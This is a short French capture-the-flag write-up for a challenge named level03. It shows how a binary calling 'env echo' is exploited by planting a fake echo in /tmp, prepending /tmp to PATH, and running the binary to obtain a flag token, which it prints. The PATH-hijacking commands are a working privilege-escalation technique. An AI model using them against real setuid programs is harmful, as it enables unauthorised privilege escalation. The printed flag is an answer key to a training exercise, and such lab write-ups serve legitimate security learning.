# Explications
Il y a un executable level03, lorsqu'on l'execute, ca nous affiche **Exploit me**

En faisant strings level03, ca nous affiche pas mal de chose dont : `/usr/bin/env echo Exploit me`
A un moment, ca appelle le binaire de echo pour afficher Exploit me.

On va créer un faux echo et lui faire utiliser getflag a la place de echo.

D'abord on cree le faux echo dans /tmp

    echo "/bin/sh -c 'getflag'"> /tmp/echo
On donne les droits a notre echo

    chmod 755 /tmp/echo
On ajoute notre echo dans le PATH

    export PATH=/tmp:$PATH
On execute level03 et on a notre token: **qi0maab88jeaj46qoumi7maus**